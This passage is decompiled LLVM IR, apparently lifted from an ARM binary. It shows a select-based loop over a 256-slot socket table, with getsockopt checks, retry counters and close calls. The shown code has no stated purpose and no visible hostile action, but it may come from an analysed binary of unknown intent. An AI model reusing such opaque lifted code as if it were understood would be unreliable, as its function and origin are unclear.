  %stack_var_-1872.2 = phi i32 [ %tmp239, %dec_label_pc_12cfc ], [ %stack_var_-1872.1, %dec_label_pc_12d04.loopexit ], [ %stack_var_-1872.1, %dec_label_pc_12b50 ], [ %stack_var_-1872.1, %dec_label_pc_12b8c ], [ %stack_var_-1872.1, %dec_label_pc_12c80 ]
  %stack_var_-1884.1 = phi i8* [ %tmp240, %dec_label_pc_12cfc ], [ %stack_var_-1884.0, %dec_label_pc_12d04.loopexit ], [ %stack_var_-1884.0, %dec_label_pc_12b50 ], [ %stack_var_-1884.0, %dec_label_pc_12b8c ], [ %stack_var_-1884.0, %dec_label_pc_12c80 ]
  %stack_var_-1880.1 = phi i32 [ %tmp241, %dec_label_pc_12cfc ], [ %v0_12bbc, %dec_label_pc_12d04.loopexit ], [ %v0_12bbc, %dec_label_pc_12b50 ], [ %v0_12bbc, %dec_label_pc_12b8c ], [ %v0_12bbc, %dec_label_pc_12c80 ]
  %stack_var_-1876.1 = phi i8 [ %tmp242, %dec_label_pc_12cfc ], [ %stack_var_-1876.0, %dec_label_pc_12d04.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_12b50 ], [ %stack_var_-1876.0, %dec_label_pc_12b8c ], [ %stack_var_-1876.0, %dec_label_pc_12c80 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1672, i32* %ip.global-to-local, align 4
  %v2_12d1c406 = load i32, i32* @sp, align 4
  %v3_12d1c407 = add i32 %v2_12d1c406, 1672
  %v4_12d1c408 = inttoptr i32 %v3_12d1c407 to i32*
  store i32 0, i32* %v4_12d1c408, align 4
  br label %dec_label_pc_12d0c.dec_label_pc_12d0c_crit_edge

dec_label_pc_12d0c.dec_label_pc_12d0c_crit_edge:  ; preds = %dec_label_pc_12d04, %dec_label_pc_12d0c.dec_label_pc_12d0c_crit_edge
  %v0_12d0c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12d1c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12d10 = add i32 %v0_12d0c.pre, 4
  store i32 %v1_12d10, i32* %r3.global-to-local, align 4
  %v1_12d14 = add i32 %v0_12d0c.pre, 1672
  store i32 %v1_12d14, i32* %ip.global-to-local, align 4
  %v7_12d18 = icmp eq i32 %v1_12d10, 128
  %v2_12d1c = load i32, i32* @sp, align 4
  %v3_12d1c = add i32 %v2_12d1c, %v1_12d14
  %v4_12d1c = inttoptr i32 %v3_12d1c to i32*
  store i32 %v0_12d1c.pre, i32* %v4_12d1c, align 4
  br i1 %v7_12d18, label %dec_label_pc_12d24, label %dec_label_pc_12d0c.dec_label_pc_12d0c_crit_edge

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12d0c.dec_label_pc_12d0c_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_12d24 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d2c400 = add i32 %v0_12d24, 4
  store i32 %v1_12d2c400, i32* %r3.global-to-local, align 4
  %v1_12d30401 = add i32 %v0_12d24, 1544
  store i32 %v1_12d30401, i32* %lr.global-to-local, align 4
  %v7_12d34402 = icmp eq i32 %v1_12d2c400, 128
  %v2_12d38403 = load i32, i32* @sp, align 4
  %v3_12d38404 = add i32 %v2_12d38403, %v1_12d30401
  %v4_12d38405 = inttoptr i32 %v3_12d38404 to i32*
  store i32 %v0_12d24, i32* %v4_12d38405, align 4
  br i1 %v7_12d34402, label %dec_label_pc_12d40, label %dec_label_pc_12d28.dec_label_pc_12d28_crit_edge

dec_label_pc_12d28.dec_label_pc_12d28_crit_edge:  ; preds = %dec_label_pc_12d24, %dec_label_pc_12d28.dec_label_pc_12d28_crit_edge
  %v0_12d28.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12d38.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12d2c = add i32 %v0_12d28.pre, 4
  store i32 %v1_12d2c, i32* %r3.global-to-local, align 4
  %v1_12d30 = add i32 %v0_12d28.pre, 1544
  store i32 %v1_12d30, i32* %lr.global-to-local, align 4
  %v7_12d34 = icmp eq i32 %v1_12d2c, 128
  %v2_12d38 = load i32, i32* @sp, align 4
  %v3_12d38 = add i32 %v2_12d38, %v1_12d30
  %v4_12d38 = inttoptr i32 %v3_12d38 to i32*
  store i32 %v0_12d38.pre, i32* %v4_12d38, align 4
  br i1 %v7_12d34, label %dec_label_pc_12d40, label %dec_label_pc_12d28.dec_label_pc_12d28_crit_edge

dec_label_pc_12d40:                               ; preds = %dec_label_pc_12d28.dec_label_pc_12d28_crit_edge, %dec_label_pc_12d24
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_12d40 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12d40, i32* @r6, align 4
  store i32 %v0_12d40, i32* @r5, align 4
  store i32 %v0_12d40, i32* @r7, align 4
  store i32 %v0_12d40, i32* %stack_var_-52, align 4
  %v2_12dfc = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_12db8

dec_label_pc_12d54:                               ; preds = %dec_label_pc_12de0, %dec_label_pc_12db8
  %storemerge222 = phi i32 [ 30, %dec_label_pc_12db8 ], [ 5, %dec_label_pc_12de0 ]
  store i32 %storemerge222, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9a8.243 to i32), i32* %r2.global-to-local, align 4
  %v2_12d58 = load i32, i32* @global_var_1d9a8.243, align 4
  store i32 %v2_12d58, i32* %r3.global-to-local, align 4
  %v1_12d5c = add i32 %v2_12dcc, 8
  %v2_12d5c = inttoptr i32 %v1_12d5c to i32*
  %v3_12d5c = load i32, i32* %v2_12d5c, align 4
  store i32 %v3_12d5c, i32* %r2.global-to-local, align 4
  %v2_12d60 = sub i32 %v2_12d58, %v3_12d5c
  store i32 %v2_12d60, i32* %r3.global-to-local, align 4
  %v3_12d64 = icmp uge i32 %v2_12d60, %storemerge222
  store i1 %v3_12d64, i1* %cpsr_c.global-to-local, align 1
  %v9_12d64 = icmp eq i32 %v2_12d60, %storemerge222
  store i1 %v9_12d64, i1* %cpsr_z.global-to-local, align 1
  %v2_12d68 = xor i1 %v9_12d64, true
  %v3_12d68 = and i1 %v3_12d64, %v2_12d68
  br i1 %v3_12d68, label %dec_label_pc_12e20, label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12d54
  store i1 %v2_12dd4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_12dd4, i1* %cpsr_z.global-to-local, align 1
  %v1_12df0 = add i32 %v2_12dcc, 4
  %v2_12df0 = inttoptr i32 %v1_12df0 to i32*
  %v3_12df0 = load i32, i32* %v2_12df0, align 4
  br i1 %v7_12dd4, label %dec_label_pc_12df0, label %dec_label_pc_12d74

dec_label_pc_12d74:                               ; preds = %dec_label_pc_12d6c
  store i32 %v3_12df0, i32* %ip.global-to-local, align 4
  %v3_12d78 = udiv i32 %v3_12df0, 32
  store i32 %v2_12dfc, i32* %r0.global-to-local, align 4
  %v3_12d80 = mul nuw nsw i32 %v3_12d78, 4
  %v2_12d84 = add i32 %v3_12d80, %v2_12dfc
  store i32 %v2_12d84, i32* %r3.global-to-local, align 4
  %v1_12d88 = add i32 %v2_12d84, -184
  %v2_12d88 = inttoptr i32 %v1_12d88 to i32*
  %v3_12d88 = load i32, i32* %v2_12d88, align 4
  %v1_12d8c = urem i32 %v3_12df0, 32
  store i32 %v1_12d8c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_12d94 = shl i32 1, %v1_12d8c
  %v8_12d94 = or i32 %v3_12d88, %v7_12d94
  store i32 %v8_12d94, i32* %r2.global-to-local, align 4
  store i32 %v8_12d94, i32* %v2_12d88, align 4
  %v0_12d9c = load i32, i32* @r6, align 4
  %v1_12d9c = load i32, i32* %ip.global-to-local, align 4
  %v3_12d9c = icmp uge i32 %v0_12d9c, %v1_12d9c
  store i1 %v3_12d9c, i1* %cpsr_c.global-to-local, align 1
  %v9_12d9c = icmp eq i32 %v0_12d9c, %v1_12d9c
  store i1 %v9_12d9c, i1* %cpsr_z.global-to-local, align 1
  %v5_12da0 = icmp slt i32 %v0_12d9c, %v1_12d9c
  br i1 %v5_12da0, label %bb308, label %bb309

bb308:                                            ; preds = %dec_label_pc_12d74
  store i32 %v1_12d9c, i32* @r6, align 4
  br label %bb309

bb309:                                            ; preds = %dec_label_pc_12de0, %dec_label_pc_13a7c, %dec_label_pc_12e54, %bb311, %dec_label_pc_12d74, %bb308
  %v3_12da4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_12da4, i32* %r3.global-to-local, align 4
  %v1_12da8 = add i32 %v3_12da4, 1
  store i32 %v1_12da8, i32* %r2.global-to-local, align 4
  %v2_12dac = icmp ugt i32 %v1_12da8, 254
  store i1 %v2_12dac, i1* %cpsr_c.global-to-local, align 1
  %v7_12dac = icmp eq i32 %v1_12da8, 255
  store i1 %v7_12dac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_12da8, i32* %stack_var_-52, align 4
  %v8_12db4 = icmp sgt i32 %v1_12da8, 255
  br i1 %v8_12db4, label %dec_label_pc_12e60, label %dec_label_pc_12db8

dec_label_pc_12db8:                               ; preds = %bb309, %dec_label_pc_12d40
  %v0_12dc4 = phi i32 [ %v1_12da8, %bb309 ], [ %v0_12d40, %dec_label_pc_12d40 ]
  store i32 ptrtoint (i32* @global_var_1d9c8.255 to i32), i32* %r0.global-to-local, align 4
  %v3_12dbc = mul i32 %v0_12dc4, 256
  store i32 %v3_12dbc, i32* %r3.global-to-local, align 4
  %v2_12dc0 = load i32, i32* @global_var_1d9c8.255, align 4
  store i32 %v2_12dc0, i32* %r1.global-to-local, align 4
  %v2_12dc8 = mul i32 %v0_12dc4, 288
  store i32 %v2_12dc8, i32* %r2.global-to-local, align 4
  %v2_12dcc = add i32 %v2_12dc0, %v2_12dc8
  store i32 %v2_12dcc, i32* @r4, align 4
  %v1_12dd0 = add i32 %v2_12dcc, 12
  %v2_12dd0 = inttoptr i32 %v1_12dd0 to i32*
  %v3_12dd0 = load i32, i32* %v2_12dd0, align 4
  store i32 %v3_12dd0, i32* %ip.global-to-local, align 4
  %v2_12dd4 = icmp ne i32 %v3_12dd0, 0
  store i1 %v2_12dd4, i1* %cpsr_c.global-to-local, align 1
  %v7_12dd4 = icmp eq i32 %v3_12dd0, 1
  store i1 %v7_12dd4, i1* %cpsr_z.global-to-local, align 1
  %v2_12dd8 = xor i1 %v7_12dd4, true
  %v3_12dd8 = and i1 %v2_12dd4, %v2_12dd8
  br i1 %v3_12dd8, label %dec_label_pc_12d54, label %dec_label_pc_12de0

dec_label_pc_12de0:                               ; preds = %dec_label_pc_12db8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12de0 = icmp eq i32 %v3_12dd0, 0
  store i1 %v2_12de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12de0, label %bb309, label %dec_label_pc_12d54

dec_label_pc_12df0:                               ; preds = %dec_label_pc_12d6c
  store i32 %v3_12df0, i32* %r0.global-to-local, align 4
  %v3_12df4 = udiv i32 %v3_12df0, 32
  %v3_12df8 = mul nuw nsw i32 %v3_12df4, 4
  store i32 %v2_12dfc, i32* %lr.global-to-local, align 4
  %v2_12e00 = add i32 %v3_12df8, %v2_12dfc
  store i32 %v2_12e00, i32* %r3.global-to-local, align 4
  %v1_12e04 = add i32 %v2_12e00, -312
  %v2_12e04 = inttoptr i32 %v1_12e04 to i32*
  %v3_12e04 = load i32, i32* %v2_12e04, align 4
  %v1_12e08 = urem i32 %v3_12df0, 32
  store i32 %v1_12e08, i32* %r1.global-to-local, align 4
  %v7_12e0c = shl i32 1, %v1_12e08
  %v8_12e0c = or i32 %v3_12e04, %v7_12e0c
  store i32 %v8_12e0c, i32* %r2.global-to-local, align 4
  %v0_12e10 = load i32, i32* @r5, align 4
  %v3_12e10 = icmp uge i32 %v0_12e10, %v3_12df0
  store i1 %v3_12e10, i1* %cpsr_c.global-to-local, align 1
  %v9_12e10 = icmp eq i32 %v0_12e10, %v3_12df0
  store i1 %v9_12e10, i1* %cpsr_z.global-to-local, align 1
  %v5_12e14 = icmp slt i32 %v0_12e10, %v3_12df0
  br i1 %v5_12e14, label %bb310, label %bb311

bb310:                                            ; preds = %dec_label_pc_12df0
  store i32 %v3_12df0, i32* @r5, align 4
  br label %bb311

bb311:                                            ; preds = %dec_label_pc_12df0, %bb310
  store i32 %v8_12e0c, i32* %v2_12e04, align 4
  br label %bb309

dec_label_pc_12e20:                               ; preds = %dec_label_pc_12d54
  %v1_12e20 = add i32 %v2_12dcc, 4
  %v2_12e20 = inttoptr i32 %v1_12e20 to i32*
  %v3_12e20 = load i32, i32* %v2_12e20, align 4
  store i32 %v3_12e20, i32* %r0.global-to-local, align 4
  %v1_12e24 = call i32 @_close(i32 %v3_12e20)
  store i32 %v1_12e24, i32* %r0.global-to-local, align 4
  %v0_12e28 = load i32, i32* @r4, align 4
  %v1_12e28 = add i32 %v0_12e28, 12
  %v2_12e28 = inttoptr i32 %v1_12e28 to i32*
  %v3_12e28 = load i32, i32* %v2_12e28, align 4
  store i32 %v3_12e28, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12e30 = icmp ugt i32 %v3_12e28, 1
  store i1 %v2_12e30, i1* %cpsr_c.global-to-local, align 1
  %v7_12e30 = icmp eq i32 %v3_12e28, 2
  store i1 %v7_12e30, i1* %cpsr_z.global-to-local, align 1
  %v2_12e34 = add i32 %v0_12e28, 4
  %v3_12e34 = inttoptr i32 %v2_12e34 to i32*
  store i32 -1, i32* %v3_12e34, align 4
  %v2_12e38 = xor i1 %v2_12e30, true
  %v3_12e38 = or i1 %v7_12e30, %v2_12e38
  br i1 %v3_12e38, label %dec_label_pc_13a7c, label %dec_label_pc_12e3c

dec_label_pc_12e3c:                               ; preds = %dec_label_pc_12e20
  %v0_12e3c = load i32, i32* @r4, align 4
  %v1_12e3c = add i32 %v0_12e3c, 284
  %v2_12e3c = inttoptr i32 %v1_12e3c to i8*
  %v3_12e3c = load i8, i8* %v2_12e3c, align 1
  %v4_12e3c = zext i8 %v3_12e3c to i32
  %v1_12e40 = add nuw nsw i32 %v4_12e3c, 1
  %v1_12e44 = urem i32 %v1_12e40, 256
  store i32 %v1_12e44, i32* %r3.global-to-local, align 4
  %v2_12e48 = icmp ugt i32 %v1_12e44, 9
  store i1 %v2_12e48, i1* %cpsr_c.global-to-local, align 1
  %v7_12e48 = icmp eq i32 %v1_12e44, 10
  store i1 %v7_12e48, i1* %cpsr_z.global-to-local, align 1
  %v1_12e4c = trunc i32 %v1_12e40 to i8
  store i8 %v1_12e4c, i8* %v2_12e3c, align 1
  %v0_12e50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12e50, label %dec_label_pc_13a7c, label %dec_label_pc_12e54

dec_label_pc_12e54:                               ; preds = %dec_label_pc_12e3c
  %v0_12e54 = load i32, i32* @r4, align 4
  store i32 %v0_12e54, i32* @r0, align 4
  %v0_12e58 = call i32 @function_12020()
  store i32 %v0_12e58, i32* %r0.global-to-local, align 4
  br label %bb309

dec_label_pc_12e60:                               ; preds = %bb309
  store i32 1, i32* %stack_var_-64, align 4
  %v0_12e68 = load i32, i32* @r6, align 4
  %v1_12e68 = load i32, i32* @r5, align 4
  %v3_12e68 = icmp uge i32 %v0_12e68, %v1_12e68
  store i1 %v3_12e68, i1* %cpsr_c.global-to-local, align 1
  %v9_12e68 = icmp eq i32 %v0_12e68, %v1_12e68
  store i1 %v9_12e68, i1* %cpsr_z.global-to-local, align 1
  %v5_12e6c = icmp slt i32 %v0_12e68, %v1_12e68
  %storemerge75 = select i1 %v5_12e6c, i32 %v1_12e68, i32 %v0_12e68
  %v2_12e80 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_12e80, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_12e88 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_12e88, i32* %ip.global-to-local, align 4
  %v2_12e8c = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v2_12e8c, i32* %r1.global-to-local, align 4
  %v1_12e90 = add i32 %storemerge75, 1
  store i32 %v1_12e90, i32* %r0.global-to-local, align 4
  %v5_12e9c = call i32 @_select(i32 %v1_12e90, i32 %v2_12e8c, i32 %v2_12e80, i32 0, i32 %v2_12e88)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12ea4 = call i32 @_time(i32 0)
  store i32 ptrtoint (i32* @global_var_1d9a8.243 to i32), i32* %lr.global-to-local, align 4
  store i32 %v1_12ea4, i32* @global_var_1d9a8.243, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v2_1306c = inttoptr i32 %stack_var_-1868.0 to i32*
  %v2_13114 = ptrtoint i32* %stack_var_-41 to i32
  %v2_13900 = ptrtoint i32* %stack_var_-84 to i32
  %v2_13908 = ptrtoint i32* %stack_var_-73 to i32
  %v2_1347c = ptrtoint i32* %stack_var_-56 to i32
  %v2_13530 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_12ef8

dec_label_pc_12ec0:                               ; preds = %dec_label_pc_12f1c, %dec_label_pc_13a8c
  %v0_12ed4 = phi i32 [ %v3_12f10, %dec_label_pc_12f1c ], [ %v0_12ec0.pre, %dec_label_pc_13a8c ]
  %v3_12ec0 = udiv i32 %v0_12ed4, 32
  %v3_12ec4 = mul nuw nsw i32 %v3_12ec0, 4
  store i32 %v2_12dfc, i32* %lr.global-to-local, align 4
  %v2_12ecc = add i32 %v3_12ec4, %v2_12dfc
  store i32 %v2_12ecc, i32* %r3.global-to-local, align 4
  %v1_12ed0 = add i32 %v2_12ecc, -184
  %v2_12ed0 = inttoptr i32 %v1_12ed0 to i32*
  %v3_12ed0 = load i32, i32* %v2_12ed0, align 4
  %v1_12ed4 = urem i32 %v0_12ed4, 32
  store i32 %v1_12ed4, i32* %r1.global-to-local, align 4
  %v2_12ed8 = add nsw i32 %v1_12ed4, -1
  %v3_12ed8 = shl i32 1, %v2_12ed8
  %v4_12ed8 = and i32 %v3_12ed8, %v3_12ed0
  %v5_12ed8 = icmp ne i32 %v4_12ed8, 0
  store i1 %v5_12ed8, i1* %cpsr_c.global-to-local, align 1
  %v6_12ed8 = lshr i32 %v3_12ed0, %v1_12ed4
  store i32 %v6_12ed8, i32* %r2.global-to-local, align 4
  %v1_12edc = urem i32 %v6_12ed8, 2
  %v2_12edc = icmp eq i32 %v1_12edc, 0
  store i1 %v2_12edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12edc, label %dec_label_pc_12ee4, label %dec_label_pc_13048.preheader

dec_label_pc_13048.preheader:                     ; preds = %dec_label_pc_12ec0
  %v0_13048101 = load i32, i32* @r5, align 4
  %v1_13048102 = add i32 %v0_13048101, 12
  %v2_13048103 = inttoptr i32 %v1_13048102 to i32*
  %v3_13048104 = load i32, i32* %v2_13048103, align 4
  store i32 %v3_13048104, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1304c100106 = icmp eq i32 %v3_13048104, 0
  store i1 %v2_1304c100106, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1304c100106, label %dec_label_pc_12ee4, label %dec_label_pc_13054.lr.ph

dec_label_pc_12ee4:                               ; preds = %dec_label_pc_13048.loopexit, %dec_label_pc_13048.preheader, %dec_label_pc_12ec0, %bb346, %dec_label_pc_139a8, %dec_label_pc_12ef8, %dec_label_pc_13aa0, %dec_label_pc_139ec
  %v3_12ee4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_12ee4, i32* %r3.global-to-local, align 4
  %v1_12ee8 = add i32 %v3_12ee4, 1
  store i32 %v1_12ee8, i32* %r2.global-to-local, align 4
  %v2_12eec = icmp ugt i32 %v1_12ee8, 254
  store i1 %v2_12eec, i1* %cpsr_c.global-to-local, align 1
  %v7_12eec = icmp eq i32 %v1_12ee8, 255
  store i1 %v7_12eec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_12ee8, i32* %stack_var_-52, align 4
  %v8_12ef4 = icmp sgt i32 %v1_12ee8, 255
  br i1 %v8_12ef4, label %dec_label_pc_1288c, label %dec_label_pc_12ef8

dec_label_pc_12ef8:                               ; preds = %dec_label_pc_12ee4, %dec_label_pc_12e60
  %v0_12f04 = phi i32 [ %v1_12ee8, %dec_label_pc_12ee4 ], [ 0, %dec_label_pc_12e60 ]
  store i32 ptrtoint (i32* @global_var_1d9c8.255 to i32), i32* %ip.global-to-local, align 4
  %v3_12efc = mul i32 %v0_12f04, 256
  store i32 %v3_12efc, i32* %r3.global-to-local, align 4
  %v2_12f00 = load i32, i32* @global_var_1d9c8.255, align 4
  store i32 %v2_12f00, i32* %r1.global-to-local, align 4
  %v2_12f08 = mul i32 %v0_12f04, 288
  store i32 %v2_12f08, i32* %r2.global-to-local, align 4
  %v2_12f0c = add i32 %v2_12f00, %v2_12f08
  store i32 %v2_12f0c, i32* @r5, align 4
  %v1_12f10 = add i32 %v2_12f0c, 4
  %v2_12f10 = inttoptr i32 %v1_12f10 to i32*
  %v3_12f10 = load i32, i32* %v2_12f10, align 4
  store i32 %v3_12f10, i32* %r4.global-to-local, align 4
  %v2_12f14 = icmp eq i32 %v3_12f10, -1
  store i1 %v2_12f14, i1* %cpsr_c.global-to-local, align 1
  %v7_12f14 = icmp eq i32 %v3_12f10, -1
  store i1 %v7_12f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12f14, label %dec_label_pc_12ee4, label %dec_label_pc_12f1c

dec_label_pc_12f1c:                               ; preds = %dec_label_pc_12ef8
  %v3_12f1c = udiv i32 %v3_12f10, 32
  %v3_12f20 = mul nuw nsw i32 %v3_12f1c, 4
  store i32 %v2_12dfc, i32* %lr.global-to-local, align 4
  %v2_12f28 = add i32 %v3_12f20, %v2_12dfc
  store i32 %v2_12f28, i32* %r3.global-to-local, align 4
  %v1_12f2c = add i32 %v2_12f28, -312
  %v2_12f2c = inttoptr i32 %v1_12f2c to i32*
  %v3_12f2c = load i32, i32* %v2_12f2c, align 4
  %v1_12f30 = urem i32 %v3_12f10, 32
  store i32 %v1_12f30, i32* %r1.global-to-local, align 4
  %v2_12f34 = add nsw i32 %v1_12f30, -1
  %v3_12f34 = shl i32 1, %v2_12f34
  %v4_12f34 = and i32 %v3_12f2c, %v3_12f34
  %v5_12f34 = icmp ne i32 %v4_12f34, 0
  store i1 %v5_12f34, i1* %cpsr_c.global-to-local, align 1
  %v6_12f34 = lshr i32 %v3_12f2c, %v1_12f30
  store i32 %v6_12f34, i32* %r2.global-to-local, align 4
  %v1_12f38 = urem i32 %v6_12f34, 2
  %v2_12f38 = icmp eq i32 %v1_12f38, 0
  store i1 %v2_12f38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12f38, label %dec_label_pc_12ec0, label %dec_label_pc_12f40

dec_label_pc_12f40:                               ; preds = %dec_label_pc_12f1c
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_13530, i32* %r3.global-to-local, align 4
  store i32 %v2_1347c, i32* %ip.global-to-local, align 4
  store i32 %v3_12f10, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v5_12f70 = call i32 @_getsockopt(i32 %v3_12f10, i32 1, i32 4, i32 %v2_13530, i32 %v2_1347c)
  %v3_12f74 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_12f74, i32* %r3.global-to-local, align 4
  %v2_12f78 = or i32 %v3_12f74, %v5_12f70
  store i32 %v2_12f78, i32* %r0.global-to-local, align 4
  %v4_12f78 = icmp eq i32 %v2_12f78, 0
  store i1 %v4_12f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_12f78, label %dec_label_pc_12f80, label %dec_label_pc_13aa0

dec_label_pc_12f80:                               ; preds = %dec_label_pc_12f40
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_12f84 = load i32, i32* @r5, align 4
  %v2_12f84 = add i32 %v1_12f84, 12
  %v3_12f84 = inttoptr i32 %v2_12f84 to i32*
  store i32 2, i32* %v3_12f84, align 4
  %v0_12f88 = call i32 @function_117dc()
  %v3_12f90 = load i8, i8* @global_var_1d9a5.250, align 1
  %v4_12f90 = zext i8 %v3_12f90 to i32
  store i32 %v4_12f90, i32* %r2.global-to-local, align 4
  %v2_12f94 = load i8, i8* bitcast (i8** @global_var_1d9a4.249 to i8*), align 4
  %v3_12f94 = zext i8 %v2_12f94 to i32
  %v4_12f98 = mul nuw nsw i32 %v4_12f90, 256
  %v5_12f98 = or i32 %v3_12f94, %v4_12f98
  store i32 %v5_12f98, i32* %r1.global-to-local, align 4
  %v2_12f9c = urem i32 %v0_12f88, %v5_12f98
  store i32 ptrtoint (i32* @global_var_1d974.245 to i32), i32* %r3.global-to-local, align 4
  %v2_12fa4 = load i32, i32* @global_var_1d974.245, align 4
  store i32 %v2_12fa4, i32* %lr.global-to-local, align 4
  %v1_12fac = load i32, i32* @r6, align 4
  %v9_12fac = icmp eq i32 %v2_12fa4, %v1_12fac
  store i1 %v9_12fac, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v2_12f9c, i32* %r0.global-to-local, align 4
  %v7_12fb4 = icmp sgt i32 %v2_12fa4, %v1_12fac
  br i1 %v7_12fb4, label %dec_label_pc_12fb8, label %dec_label_pc_13a88

dec_label_pc_12fb8:                               ; preds = %dec_label_pc_12f80
  %v2_12fbc = load i32, i32* @global_var_1d9a0.247, align 4
  store i32 %v2_12fbc, i32* %r3.global-to-local, align 4
  store i32 %v1_12fac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12fd8

dec_label_pc_12fc8:                               ; preds = %dec_label_pc_12ff0, %dec_label_pc_12fd8
  %v1_12fc8 = add i32 %v0_12fc8, 1
  store i32 %v1_12fc8, i32* %ip.global-to-local, align 4
  %v3_12fcc = icmp uge i32 %v1_12fc8, %v2_12fa4
  store i1 %v3_12fcc, i1* %cpsr_c.global-to-local, align 1
  %v9_12fcc = icmp eq i32 %v1_12fc8, %v2_12fa4
  store i1 %v9_12fcc, i1* %cpsr_z.global-to-local, align 1
  %v1_12fd0 = add i32 %v0_12fd0, 16
  store i32 %v1_12fd0, i32* %r3.global-to-local, align 4
  br i1 %v9_12fcc, label %dec_label_pc_13a88, label %dec_label_pc_12fd8

dec_label_pc_12fd8:                               ; preds = %dec_label_pc_12fc8, %dec_label_pc_12fb8
  %v0_12fc8 = phi i32 [ %v1_12fc8, %dec_label_pc_12fc8 ], [ %v1_12fac, %dec_label_pc_12fb8 ]
  %v0_12fd0 = phi i32 [ %v1_12fd0, %dec_label_pc_12fc8 ], [ %v2_12fbc, %dec_label_pc_12fb8 ]
  store i32 %v0_12fd0, i32* %r1.global-to-local, align 4
  %v1_12fdc = add i32 %v0_12fd0, 9
  %v2_12fdc = inttoptr i32 %v1_12fdc to i8*
  %v3_12fdc = load i8, i8* %v2_12fdc, align 1
  %v4_12fdc = zext i8 %v3_12fdc to i32
  store i32 %v4_12fdc, i32* %r2.global-to-local, align 4
  %v1_12fe0 = add i32 %v0_12fd0, 8
  %v2_12fe0 = inttoptr i32 %v1_12fe0 to i8*
  %v3_12fe0 = load i8, i8* %v2_12fe0, align 1
  %v4_12fe0 = zext i8 %v3_12fe0 to i32
  %v4_12fe4 = mul nuw nsw i32 %v4_12fdc, 256
  %v5_12fe4 = or i32 %v4_12fe0, %v4_12fe4
  store i32 %v5_12fe4, i32* %r3.global-to-local, align 4
  %v3_12fe8 = icmp uge i32 %v5_12fe4, %v2_12f9c
  store i1 %v3_12fe8, i1* %cpsr_c.global-to-local, align 1
  %v9_12fe8 = icmp eq i32 %v5_12fe4, %v2_12f9c
  store i1 %v9_12fe8, i1* %cpsr_z.global-to-local, align 1
  %v2_12fec = xor i1 %v9_12fe8, true
  %v3_12fec = and i1 %v3_12fe8, %v2_12fec
  br i1 %v3_12fec, label %dec_label_pc_12fc8, label %dec_label_pc_12ff0

dec_label_pc_12ff0:                               ; preds = %dec_label_pc_12fd8
  %v1_12ff0 = add i32 %v0_12fd0, 10
  %v2_12ff0 = inttoptr i32 %v1_12ff0 to i8*
  %v3_12ff0 = load i8, i8* %v2_12ff0, align 1
  %v4_12ff0 = zext i8 %v3_12ff0 to i32
  store i32 %v4_12ff0, i32* %r3.global-to-local, align 4
  %v1_12ff4 = add i32 %v0_12fd0, 11
  %v2_12ff4 = inttoptr i32 %v1_12ff4 to i8*
  %v3_12ff4 = load i8, i8* %v2_12ff4, align 1
  %v4_12ff4 = zext i8 %v3_12ff4 to i32
  store i32 %v4_12ff4, i32* %r2.global-to-local, align 4
  %v4_12ff8 = mul nuw nsw i32 %v4_12ff4, 256
  %v5_12ff8 = or i32 %v4_12ff8, %v4_12ff0
  store i32 %v5_12ff8, i32* %r3.global-to-local, align 4
  %v3_12ffc = icmp uge i32 %v5_12ff8, %v2_12f9c
  store i1 %v3_12ffc, i1* %cpsr_c.global-to-local, align 1
  %v9_12ffc = icmp eq i32 %v5_12ff8, %v2_12f9c
  store i1 %v9_12ffc, i1* %cpsr_z.global-to-local, align 1
  %v2_13000 = xor i1 %v3_12ffc, true
  %v3_13000 = or i1 %v9_12ffc, %v2_13000
